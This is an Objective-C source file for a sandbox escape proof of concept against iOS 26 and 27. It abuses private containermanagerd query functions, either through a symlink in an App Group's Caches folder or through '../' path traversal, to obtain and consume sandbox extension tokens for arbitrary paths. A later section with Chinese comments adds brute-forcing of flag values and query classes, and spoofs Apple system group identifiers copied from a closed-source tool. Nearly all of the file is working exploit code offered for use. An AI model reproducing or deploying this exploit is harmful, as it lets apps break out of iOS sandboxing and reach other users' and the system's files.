//
//  worse_query.m
//  worse_query
//
//  Created by Taj C on 8/20/26.
//

/*
     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
     Copyright (C) 2026 Taj C (forcequit)

     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
     (at your option) any later version.

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.

     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void (*container_query_set_part_domain_fn)(void *, const char *);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

// Remove symlink and recreate Caches directory
static void clean_symlink(NSString *group) {
    if (group != NULL) {
        NSFileManager *files = [NSFileManager defaultManager];
        NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
        if (groupRoot) {
            NSURL *caches = [groupRoot URLByAppendingPathComponent: @"Library/Caches"];
            [files removeItemAtURL: caches error: nil];
            [files createDirectoryAtURL: caches withIntermediateDirectories: false attributes: nil error: nil];
        }
    }
    return;
}

// So, who's ready for round two?
int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    // Check if the target exists
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255; // Nothing exists at this path, and create_dir is false
    }
    
    // Get the App Group's path
    // An App Group identifier you control is required for this
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
    if (!groupRoot) return -1; // App Group doesn't exist or we can't access it
    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];
    
    // Resolve functions
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2; // dlopen failed?
    
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -2; // Failed to resolve a function (unsupported OS)
    }
    
    // Create query
    void *query = query_create();
    if (!query) {
        dlclose(mgr);
        return -3; // Failed to create query
    }
    
    // Set up query
    xpc_object_t identifier;
    query_set_class(query, 7); // We're only using class 7 here (appGroup), which goes to containermanagerd
    identifier = xpc_string_create(group.UTF8String);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // The query's part sets our base path, part 3 is Library/Caches
    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL); // Accessing App Group containers on iOS 26.x needs different flags, for whatever reason
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }
    
    // Set up symlink
    [files removeItemAtPath: caches error: nil];
    if ([files createSymbolicLinkAtPath: caches withDestinationPath: target error: nil] == false) {
        dlclose(mgr);
        return -4; // Failed to create symlink
    }
    
    // Send our query over
    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -5; // Query rejected by containermanagerd
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        dlclose(mgr);
        clean_symlink(group);
        return -6; // Kernel refused to issue a sandbox extension
    }
    
    // Consume sandbox extension and clean up
    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    dlclose(mgr);
    clean_symlink(group);
    
    return handle;
}

// You should probably call this when you're done
void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}

//
// ---- 本项目扩展（非上游代码）----
// 多组 flags 逐个试 + class 2 备用查询。flags 取值观察自一款支持到
// iOS 27.3 的同类实现（闭源，照思路重写，非拷贝）：
//  - class 7：0x8100000000 → 0x8000000000 → 0x0800000000
//    （最后一组即上游默认值；0x0800… 是上游 iOS 26.x 那组）
//  - class 2：0x8100000000 → 0x8000000000 → 0x40000000 → 0x42000000
// class 2 的具体路径解析语义没有上游源码可对照，这里沿用与 class 7
// 相同的 group identifiers + part 3 + 符号链接，真机验证后再说。
static const uint64_t kClass7Flags[] = {
    0x0000008100000000ULL,
    0x0000008000000000ULL,
    0x0000000800000000ULL,
};
static const uint64_t kClass2Flags[] = {
    0x0000008100000000ULL,
    0x0000008000000000ULL,
    0x0000000040000000ULL,
    0x0000000042000000ULL,
};

// 免符号链接的试探：查一个组标识（系统组或自己的组），用 part_domain
// 一路 ../ 穿到目标路径，全程不需要本进程拿到组容器路径。这是从 Vellum
// 1.5 拆出来的另一条路（bad_query，同思路重写），常量已照反汇编核对：
//   class：给了组用 7，不给组用 13；part 固定 3；
//   flags：0x8000000000（常规）/ 0x800000000（alt）；
//   穿透层数：给了组 8 级 ../，不给组 7 级 ../。
static int64_t wq_attempt_traverse(int query_class, uint64_t flags, int up_levels,
                                   NSString *identifier, NSString *target,
                                   container_query_create_fn query_create,
                                   container_query_set_class_fn query_set_class,
                                   container_query_set_identifiers_fn query_set_group_identifiers,
                                   container_query_set_flags_fn query_set_flags,
                                   container_query_set_part_fn query_set_part,
                                   container_query_set_part_domain_fn query_set_part_domain,
                                   container_query_get_single_result_fn query_get_single_result,
                                   container_query_free_fn query_free,
                                   container_copy_sandbox_token_fn copy_sandbox_token,
                                   sandbox_extension_consume_fn consume_extension) {
    void *query = query_create();
    if (!query) return -3;

    query_set_class(query, query_class);
    xpc_object_t ident = xpc_string_create(identifier.UTF8String);
    query_set_group_identifiers(query, ident);
    query_set_part(query, 3);
    NSMutableString *part = [NSMutableString string];
    for (int i = 0; i < up_levels; i++) [part appendString: @"../"];
    [part appendString: target];
    query_set_part_domain(query, part.UTF8String);
    query_set_flags(query, flags);

    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        return -5; // daemon 拒了（result 为空）
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        return -6; // 内核拒发沙箱扩展
    }
    int64_t handle = consume_extension(token);
    free(token);
    query_free(query);
    return handle; // 消费失败时句柄为负（最高位置位），调用方按失败算
}

// 用一个查询类别 + 一组 flag 试一次逃逸。成功返回正句柄，失败返回
// 负数错误码（同 worse_query 的语义）。每次调用都重建符号链接，
// 避免 containermanagerd 缓存住上一次的解析结果。
static int64_t wq_attempt(uint64_t query_class, uint64_t flags,
                          NSString *target, NSString *caches,
                          NSFileManager *files,
                          container_query_create_fn query_create,
                          container_query_set_class_fn query_set_class,
                          container_query_set_identifiers_fn query_set_group_identifiers,
                          container_query_set_flags_fn query_set_flags,
                          container_query_set_part_fn query_set_part,
                          container_query_get_single_result_fn query_get_single_result,
                          container_query_free_fn query_free,
                          container_copy_sandbox_token_fn copy_sandbox_token,
                          sandbox_extension_consume_fn consume_extension,
                          NSString *group) {
    // 符号链接每次都拆了重建，尽量绕开守护进程的解析缓存
    [files removeItemAtPath: caches error: nil];
    if ([files createSymbolicLinkAtPath: caches withDestinationPath: target error: nil] == false) {
        return -4; // Failed to create symlink
    }

    void *query = query_create();
    if (!query) return -3; // Failed to create query

    query_set_class(query, query_class);
    xpc_object_t identifier = xpc_string_create(group.UTF8String);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // part 3 = Library/Caches，路径上吃了上面的符号链接
    query_set_flags(query, flags);

    void *result = query_get_single_result(query);
    if (!result) {
        query_free(query);
        return -5; // Query rejected by containermanagerd
    }
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(query);
        return -6; // Kernel refused to issue a sandbox extension
    }

    int64_t handle = consume_extension(token);
    query_free(query);
    free(token);
    return handle;
}

// 免符号链接的穿出路线（Vellum bad_query 思路，常量见上面注释）：
// class 2 / class 7 用自己的组（8 级 ../），class 13 用系统组（7 级 ../），
// 逐个试到成功。全失败返回最后一条路的负错误码，out 参数记录最后一次尝试。
// 2026-11-10 朋友 27.2 手机实测：抽屉好好的、class 7 符号链接路三组全被
// 内核拒发扩展（-6）——这条路不能再只留给"抽屉打不开"的情形。
static int64_t wq_traverse_routes(NSString *group, NSString *target,
                                  container_query_create_fn query_create,
                                  container_query_set_class_fn query_set_class,
                                  container_query_set_identifiers_fn query_set_group_identifiers,
                                  container_query_set_flags_fn query_set_flags,
                                  container_query_set_part_fn query_set_part,
                                  container_query_set_part_domain_fn query_set_part_domain,
                                  container_query_get_single_result_fn query_get_single_result,
                                  container_query_free_fn query_free,
                                  container_copy_sandbox_token_fn copy_sandbox_token,
                                  sandbox_extension_consume_fn consume_extension,
                                  int64_t *out_last_code,
                                  int *out_last_class, int *out_last_flag_index) {
    int64_t last = -5;
    int lastClass = 2, lastIndex = -1;
    // 2026-11-11 拆人家原包对齐：人家借通行证不认签名带的组，class 7
    // 直接拿系统自带组当身份（systemgroup.com.apple.mobilegestaltcache、
    // group.com.apple.PosterBoard），所以谁的手机都一样。层数按 8/7/9
    // 都试，两套 flags，谁成用谁；全不行再退回签名组的路。
    NSString *kVellumIds[2] = { @"systemgroup.com.apple.mobilegestaltcache",
                                @"group.com.apple.PosterBoard" };
    int attempt = 0;
    for (int idIdx = 0; idIdx < 2; idIdx++) {
        for (int lv = 0; lv < 3; lv++) {
            int up = lv == 0 ? 8 : (lv == 1 ? 7 : 9);
            for (int f = 0; f < 2; f++) {
                uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
                int64_t h = wq_attempt_traverse(7, flag, up, kVellumIds[idIdx], target,
                                                query_create, query_set_class, query_set_group_identifiers,
                                                query_set_flags, query_set_part, query_set_part_domain,
                                                query_get_single_result, query_free,
                                                copy_sandbox_token, consume_extension);
                if (h >= 0) {
                    if (out_last_class) *out_last_class = 7;
                    if (out_last_flag_index) *out_last_flag_index = attempt;
                    return h;
                }
                last = h; lastClass = 7; lastIndex = attempt++;
            }
        }
    }
    for (int f = 0; f < 2; f++) {
        uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
        int64_t h = wq_attempt_traverse(2, flag, 8, group, target,
                                        query_create, query_set_class, query_set_group_identifiers,
                                        query_set_flags, query_set_part, query_set_part_domain,
                                        query_get_single_result, query_free,
                                        copy_sandbox_token, consume_extension);
        if (h >= 0) {
            if (out_last_class) *out_last_class = 2;
            if (out_last_flag_index) *out_last_flag_index = f;
            return h;
        }
        last = h; lastClass = 2; lastIndex = f;
    }
    for (int f = 0; f < 2; f++) {
        uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
        int64_t h = wq_attempt_traverse(7, flag, 8, group, target,
                                        query_create, query_set_class, query_set_group_identifiers,
                                        query_set_flags, query_set_part, query_set_part_domain,
                                        query_get_single_result, query_free,
                                        copy_sandbox_token, consume_extension);
        if (h >= 0) {
            if (out_last_class) *out_last_class = 7;
            if (out_last_flag_index) *out_last_flag_index = 2 + f;
            return h;
        }
        last = h; lastClass = 7; lastIndex = 2 + f;
    }
    NSString *kSysIds[2] = { @"systemgroup.com.apple.mobilegestaltcache", @"group.com.apple.PosterBoard" };
    for (int idIdx = 0; idIdx < 2; idIdx++) {
        for (int f = 0; f < 2; f++) {
            uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
            int64_t h = wq_attempt_traverse(13, flag, 7, kSysIds[idIdx], target,
                                            query_create, query_set_class, query_set_group_identifiers,
                                            query_set_flags, query_set_part, query_set_part_domain,
                                            query_get_single_result, query_free,
                                            copy_sandbox_token, consume_extension);
            if (h >= 0) {
                if (out_last_class) *out_last_class = 13;
                if (out_last_flag_index) *out_last_flag_index = 4 + idIdx * 2 + f;
                return h;
            }
            last = h; lastClass = 13; lastIndex = 4 + idIdx * 2 + f;
        }
    }
    if (out_last_code) *out_last_code = last;
    if (out_last_class) *out_last_class = lastClass;
    if (out_last_flag_index) *out_last_flag_index = lastIndex;
    return last;
}

int64_t worse_query_escape2(NSString *target, NSString *group, bool create_dir,
                            bool allow_class2, int64_t *out_last_code,
                            int *out_last_class, int *out_last_flag_index) {
    if (out_last_code) *out_last_code = 0;
    if (out_last_class) *out_last_class = 0;
    if (out_last_flag_index) *out_last_flag_index = -1;

    // Check if the target exists
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) {
            if (out_last_code) *out_last_code = -255;
            return -255;
        }
    }

    // Get the App Group's path（拿不到也不立即放弃，后面有免组的路）
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
    NSString *caches = groupRoot ? [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path] : nil;

    // Resolve functions（与 worse_query 相同的一套）
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) {
        if (out_last_code) *out_last_code = -2;
        return -2;
    }

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_set_part_domain_fn query_set_part_domain = (container_query_set_part_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        if (out_last_code) *out_last_code = -2;
        return -2; // Failed to resolve a function (unsupported OS)
    }

    if (!groupRoot && !query_set_part_domain) {
        // 连遍历接口都没有（系统太老），免组的路走不通，按原样报错
        dlclose(mgr);
        if (out_last_code) *out_last_code = -1;
        return -1;
    }

    if (!groupRoot) {
        // 免符号链接的路（bad_query 思路）：逐个组合试，哪个成了用哪个。
        // class 2 / class 7 查自己的组标识（8 级穿透），class 13 查系统组（7 级穿透）。
        int64_t h = wq_traverse_routes(group, target,
                                       query_create, query_set_class, query_set_group_identifiers,
                                       query_set_flags, query_set_part, query_set_part_domain,
                                       query_get_single_result, query_free,
                                       copy_sandbox_token, consume_extension,
                                       out_last_code, out_last_class, out_last_flag_index);
        dlclose(mgr);
        return h;
    }

    // 第一轮：class 7，三组 flags 逐个试
    for (size_t i = 0; i < sizeof(kClass7Flags) / sizeof(kClass7Flags[0]); i++) {
        int64_t h = wq_attempt(7, kClass7Flags[i], target, caches, files,
                               query_create, query_set_class, query_set_group_identifiers,
                               query_set_flags, query_set_part, query_get_single_result,
                               query_free, copy_sandbox_token, consume_extension, group);
        if (h >= 0) {
            dlclose(mgr);
            if (out_last_class) *out_last_class = 7;
            if (out_last_flag_index) *out_last_flag_index = (int)i;
            return h;
        }
    }

    // 第二轮：class 2 备用查询（要调用方明确允许，兜 27.3）
    if (allow_class2) {
        for (size_t i = 0; i < sizeof(kClass2Flags) / sizeof(kClass2Flags[0]); i++) {
            int64_t h = wq_attempt(2, kClass2Flags[i], target, caches, files,
                                   query_create, query_set_class, query_set_group_identifiers,
                                   query_set_flags, query_set_part, query_get_single_result,
                                   query_free, copy_sandbox_token, consume_extension, group);
            if (h >= 0) {
                dlclose(mgr);
                if (out_last_class) *out_last_class = 2;
                if (out_last_flag_index) *out_last_flag_index = (int)i;
                return h;
            }
        }
    }

    // 第三轮：免符号链接穿出（Vellum 走的路）。抽屉开得好好的也可能被
    // 内核拒发扩展（27.2 朋友手机实测 class 7 三组全 -6），这条路照样走。
    // 注意 traverse 不需要符号链接，但上面符号链接路可能留了一个在
    // Library/Caches——无论成败都拆干净。
    int64_t h3 = wq_traverse_routes(group, target,
                                    query_create, query_set_class, query_set_group_identifiers,
                                    query_set_flags, query_set_part, query_set_part_domain,
                                    query_get_single_result, query_free,
                                    copy_sandbox_token, consume_extension,
                                    out_last_code, out_last_class, out_last_flag_index);
    clean_symlink(group);
    dlclose(mgr);
    if (h3 < 0 && out_last_code) *out_last_code = h3;
    return h3;
}
